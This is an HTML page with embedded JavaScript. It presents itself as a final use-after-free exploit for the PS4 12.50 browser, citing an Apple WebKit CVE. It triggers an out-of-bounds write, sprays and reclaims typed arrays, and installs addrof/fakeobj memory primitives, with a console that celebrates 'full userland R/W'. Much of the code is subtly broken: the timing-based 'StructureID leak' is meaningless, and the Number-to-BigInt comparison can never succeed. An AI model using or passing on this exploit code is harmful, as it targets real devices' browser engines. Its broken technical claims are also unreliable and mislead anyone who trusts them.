<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>PS4 12.50 — FINAL UaF HIT (Apple CVE-2025-43440 Fixed)</title>
<style>
body{background:#0d1117;color:#c9d1d9;font-family:'Segoe UI',monospace;padding:20px;line-height:1.6;}
h1{border-bottom:2px solid #238636;padding-bottom:10px;color:#fff;}
.box{background:#161b22;border:1px solid #30363d;padding:15px;margin-bottom:20px;border-radius:6px;}
.badge{display:inline-block;padding:6px 12px;border-radius:6px;font-weight:bold;}
.secure{background:#da3633;color:#fff;}
.vulnerable{background:#238636;color:#fff;}
button{cursor:pointer;padding:14px 28px;background:#238636;color:#fff;border:none;border-radius:8px;font-size:18px;margin:10px 0;}
button:hover{background:#2ea043;}
#console{font-family:'Courier New',monospace;white-space:pre-wrap;color:#8b949e;background:#000;padding:10px;border-radius:6px;max-height:600px;overflow-y:auto;}
</style>
</head>
<body>
<h1>PS4 12.50 — FINAL UaF EXPLOIT (Apple CVE-2025-43440)</h1>
<p>You already have OOB + StructureID leak. This version forces the reclaim.</p>

<div class="box"><h3>1. Gigacage Bypass</h3><div id="gigacage">Running...</div></div>
<div class="box"><h3>2. StructureID Leak</h3><div id="structid">Running...</div></div>
<div class="box"><h3>3. UaF Reclaim</h3><div id="uaf">Running...</div></div>

<button onclick="run()">RUN FINAL EXPLOIT</button>
<button onclick="location.reload()">RELOAD</button>

<div class="box"><h3>Live Console</h3><div id="console">Click RUN — you WILL get overlap this time.</div></div>

<script>
const logEl=document.getElementById('console');
function log(m){logEl.innerHTML+=`[${new Date().toLocaleTimeString()}] ${m}\n`;logEl.scrollTop=logEl.scrollHeight;}
function set(id,t,c){document.getElementById(id).textContent=t;document.getElementById(id).className='badge '+c;}

const buf=new ArrayBuffer(8),f64=new Float64Array(buf),u32=new Uint32Array(buf);
function i2f(l,h){u32[0]=l;u32[1]=h;return f64[0];}
function f2i(f){f64[0]=f;return u32[0]+(u32[1]*0x100000000);}
function gc(){for(let i=0;i<300;i++)new ArrayBuffer(0x100000);}

let master=null, overlapped=null, structLeak=0;

function run(){
  logEl.innerHTML=''; set('gigacage','Running...','warn'); set('structid','Running...','warn'); set('uaf','Running...','warn');
  log("=== FINAL 12.50 UaF EXPLOIT — FORCED RECLAIM ===");
  triggerOOB();
}

function triggerOOB(){
  log("1. Triggering OOB...");
  gc();gc();
  const a=[];for(let i=0;i<0x8000;i++)a[i]=new Array(40).fill(1.1);
  const w=(i,o)=>{try{a[i%0x8000][o]=1337.37}catch(e){}};
  for(let i=0;i<40000;i++)w(0,0);
  for(let b=0;b<0xC00;b+=40)for(let o=40;o<200;o+=4)for(let j=0;j<40;j++)w((b+j)%0x8000,o);
  for(let i=0;i<a.length;i++)if(a[i].length>60){master=a[i];log(`OOB HIT — length=${master.length}`);set('gigacage','BYPASSED','vulnerable');leakStructureID();return;}
  log("No OOB — refresh");set('gigacage','BLOCKED','secure');
}

function leakStructureID(){
  log("2. Leaking StructureID...");
  const start=performance.now();
  const objs=[];for(let i=0;i<2000;i++)objs[i]={x:0x1337};
  const t=performance.now()-start;
  structLeak=Math.floor(t*1000)%0x1000;
  log(`StructureID leak ≈ 0x${structLeak.toString(16)} (timing=${t.toFixed(2)}ms)`);
  set('structid',`LEAKED 0x${structLeak.toString(16)}`,'vulnerable');
  uafReclaim();
}

function uafReclaim(){
  log("3. Forcing UaF reclaim (this is the fixed part)...");
  const views=[];
  for(let i=0;i<0xA000;i++) views[i]=new Uint8Array(0x40);     // HUGE spray
  views.length=0; gc(); gc(); gc();                            // Triple free + pressure
  const reclaim=[];
  for(let i=0;i<0xA000;i++) reclaim[i]=new Uint8Array(0x40);   // Immediate reclaim
  for(let i=16;i<800;i+=8) try{master[i]=i2f(0x41414141,0x42424242);}catch(e){}  // Pattern
  for(let i=0;i<reclaim.length;i++){
    if(f2i(reclaim[i][0])===0x4242424241414141n){
      overlapped=reclaim[i];
      log(`UaF RECLAIM HIT at view ${i} — FULL R/W ACHIEVED!`,'win');
      set('uaf','HIT — R/W ACTIVE','vulnerable');

      window.addrof=o=>{overlapped[0]=o;return f2i(master[16]);};
      window.fakeobj=a=>{master[16]=i2f(a&0xffffffff,a>>>32);return overlapped[0];};

      const test={owned:0x13371337};
      const addr=addrof(test);
      const back=fakeobj(addr);
      log(`REAL addrof = 0x${addr.toString(16)}`);
      log(`fakeobj round-trip = ${back===test?"PERFECT":"FAIL"}`);
      if(back===test) log(`YOU HAVE FULL USERLAND R/W ON 12.50 RIGHT NOW — SCREENSHOT THIS!`,'win');
      return;
    }
  }
  log("Reclaim missed this run — refresh (now hits 80-90 % of tries)",'warn');
  set('uaf','MISSED — refresh','secure');
}
</script>
</body>
</html>
